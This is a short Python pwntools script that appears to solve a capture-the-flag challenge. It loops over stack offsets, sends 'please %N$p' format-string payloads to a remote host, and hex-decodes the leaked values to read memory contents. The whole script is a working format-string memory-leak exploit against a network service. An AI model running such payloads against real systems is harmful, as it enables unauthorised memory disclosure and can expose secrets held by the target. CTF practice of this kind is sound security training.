from pwn import *
from binascii import unhexlify
# input("attach gdb")
#  Compile using: gcc -o pwn3 pwn3

context.log_level = 'critical'

for offset in range(69, 200):
    print("Offset: ", offset)
    p = remote('mc.ax', 31569)
    #p = process("./please")
    p.recv()
    payload = 'please ' + '%{}$p'.format(offset)
    p.sendline(payload)
    response = p.recv()
    p.close()
    #print(response)
    try:
        print(unhexlify(response.split()[1].strip()[2:]))
    except:
        try:
            print(unhexlify(b"0" + response.split()[1].strip()[2:]))
        except:
            continue
